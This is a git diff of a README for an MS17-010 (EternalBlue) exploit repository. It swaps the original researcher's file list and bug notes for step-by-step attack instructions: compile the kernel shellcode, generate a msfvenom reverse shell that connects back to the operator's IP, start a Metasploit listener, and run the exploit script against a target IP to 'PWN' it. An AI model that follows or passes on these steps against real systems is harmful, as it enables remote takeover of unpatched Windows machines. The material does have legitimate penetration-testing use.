@@ -1,43 +1,72 @@
-# MS17-010
+# MS17-010 (ETERNAL BLUE) Exploit Code
 
-This repository is for public my work on MS17-010. I have no plan to do any support. **All support issues will not get response from me**.
+This is some no-bs public exploit code that generates valid shellcode for the eternal blue exploit and scripts out the event listener with the metasploit multi-handler.
 
-## Files
+This version of the exploit is prepared in a way where you can exploit eternal blue WITHOUT metasploit. Your options for auto shell generation are to generate shellcode with msfvenom that has meterpreter (i.e. with metasploit) or to generate a normal windows cmd shell (i.e. without metasploit). Alternatively you can elect to brew in your own shellcode.
 
- * **BUG.txt** MS17-010 bug detail and some analysis
- * **checker.py** Script for finding accessible named pipe
- * **eternalblue_exploit7.py** Eternalblue exploit for windows 7/2008
- * **eternalblue_exploit8.py** Eternalblue exploit for windows 8/2012 x64
- * **eternalblue_poc.py** Eternalblue PoC for buffer overflow bug
- * **eternalblue_kshellcode_x64.asm** x64 kernel shellcode for my Eternalblue exploit. This shellcode should work on Windows Vista and later
- * **eternalblue_kshellcode_x86.asm** x86 kernel shellcode for my Eternalblue exploit. This shellcode should work on Windows Vista and later
- * **eternalblue_sc_merge.py** Script for merging eternalblue x86 and x64 shellcode. Eternalblue exploit, that support both x86 and x64, with merged shellcode has no need to detect a target architecture
- * **eternalchampion_leak.py** Eternalchampion PoC for leaking info part
- * **eternalchampion_poc.py** Eternalchampion PoC for controlling RIP
- * **eternalchampion_poc2.py** Eternalchampion PoC for getting code execution
- * **eternalromance_leak.py** Eternalromance PoC for leaking info part
- * **eternalromance_poc.py** Eternalromance PoC for OOB write
- * **eternalromance_poc2.py** Eternalromance PoC for controlling a transaction which leading to arbitrary read/write
- * **eternalsynergy_leak.py** Eternalsynergy PoC for leaking info part
- * **eternalsynergy_poc.py** Eternalsynergy PoC for demonstrating heap spraying with large paged pool
- * **infoleak_uninit.py** PoC for leaking info from uninitialized transaction data buffer
- * **mysmb.py** Extended Impacket SMB class for easier to exploit MS17-010 bugs
- * **npp_control.py** PoC for controlling nonpaged pool allocation with session setup command
- * **zzz_exploit.py** Exploit for Windows 2000 and later (requires access to named pipe)
+This allows for this version of the MS17-010 exploit to be a bit more flexible, and also fully functional, as many exploits leave out the steps to compile the kernel shellcode that comes with this in most repos.
+
+Included is also an enternal blue checker script that allows you to test if your target is potentially vulnerable to MS17-010
+run `python eternalblue_checker.py <TARGET-IP>`
+
+## USAGE:
+Navigate to the `shellcode` directory in the repo:
+run `./shell_prep.sh`
+Follow the prompts, for example:
+```
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+y
+IP for reverse connection:
+<YOUR-IP>
+PORT you want x64 to listen on:
+<SOME PORT>
+PORT you want x86 to listen on:
+<SOME OTHER PORT>
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+0
+```
+
+After the script finishes there will be a shellcode binary named `sc_all.bin` in the shellcode directory
 
 
-## Anonymous user
+Next, navigate to the main repo directory:
+run `listener_prep.sh`
+Follow the propmts, for example:
+```
+ /,-
+  ||)
+  \\_, )
+   `--'
+Enternal Blue Metasploit Listener
 
-Anonymous user (null session) get more restriction on default settings of new Windows version. To exploit Windows SMB without authentication, below behavior should be aware.
+IP for reverse connection:
+<YOUR-IP>
+PORT for x64 reverse connection:
+<SOME PORT>
+PORT for x86 reverse connection:
+<SOME OTHER PORT>
+Enter 0 for meterpreter shell or 1 for regular cmd shell:
+0
+Starting listener...
+```
 
-* Since Windows Vista, default settings does not allow anonymous to access any named pipe
-* Since Windows 8, default settings does not allow anonymous to access IPC$ share (IPC$ might be acessible but cannot do much)
+## PWN:
+If you have completed the USAGE steps, now you're ready to PWN the target.
+
+run `python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin>`
+
+This has only been tested on Windows 7/Server 2008, however the exploit included in this repo also includes the Windows 8 version and *should* work.
 
 
-## About NSA exploits
-
-* **Eternalblue** requires only access to IPC$ to exploit a target while other exploits require access to named pipe too. So the exploit always works against Windows < 8 in all configuration (if tcp port 445 is accessible). However, Eternalblue has a chance to crash a target higher than other exploits.
-* **Eternalchampion** requires access to named pipe. The exploit has no chance to crash a target.
-* **Eternalromance** requires access to named pipe. The exploit can target Windows < 8 because the bug for info leak is fixed in Windows 8. The exploit should have a chance to crash a target lower than Eternalblue. I never test a reliable of the exploit.
-* **Eternalsynergy** requires access to named pipe. I believe this exploit is modified from Eternalromance to target Windows 8 and later. Eternalsynergy uses another bug for info leak and does some trick to find executable memory (I do not know how it works because I read only output log and pcap file).
-
+The original exploit code that this repo pulls from is located here: https://github.com/worawit/MS17-010
